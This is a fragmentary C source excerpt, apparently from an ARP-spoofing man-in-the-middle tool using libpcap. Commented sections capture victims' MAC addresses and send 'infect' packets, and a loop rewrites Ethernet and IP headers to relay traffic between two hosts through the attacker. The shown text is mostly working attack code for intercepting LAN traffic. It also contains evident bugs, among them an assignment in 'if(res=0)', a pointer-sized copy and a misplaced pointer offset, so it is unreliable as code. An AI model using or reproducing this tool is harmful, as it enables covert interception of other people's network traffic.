...
//===========================capture reply from sender and store sender_mac================
	u_char temp[4];
...
//==================send packet to target=====================
	...
	memcpy(arph.arp_spa, &my_ip, 4);  //&my_ip.s_addr
	memcpy(arph.arp_tha, broadcast, 6);
...
//==================capture reply packet from target and store target_mac=============
	//u_char temp[4];
	//struct pcap_pkthdr *header;
	//const u_char *re_pkt_data;
	//int res=0;
...
//==========================end infect packet=============================
//================capture reply packet from sender and send to target or vise versa====================
	while((res=pcap_next_ex(pcd, &header, &re_pkt_data))>=0){
		if(res=0) continue;
		struct ether_header *rethh = (struct ether_header *)re_pkt_data;
		struct ip *iph = (struct ip*)(re_pkt_data+14);
		

		if((!memcmp(rethh->ether_dhost,my_mac,6)&&(!memcmp(rethh->ether_shost,sender_mac,6)))){
				
			memcpy(rethh->ether_dhost,target_mac,6);////here!!!
			memcpy(rethh->ether_shost,my_mac, 6);

			memcpy(&iph->ip_src,&sender_ip.sin_addr,4);

			
			memcpy(packet,rethh,sizeof(rethh));
			memcpy(packet+14, iph, sizeof(struct ip));
			memcpy(packet+34, &re_pkt_data+34, iph->ip_len-20);
	
	
			pcap_sendpacket(pcd, packet, iph->ip_len+14);


		}
		else if((!memcmp(rethh->ether_dhost,my_mac,6)&&(!memcmp(rethh->ether_shost,target_mac,6)))){

			memcpy(rethh->ether_dhost,sender_mac,6);////here!!!
			memcpy(rethh->ether_shost,my_mac, 6);

			memcpy(&iph->ip_src,&target_ip.sin_addr,4);
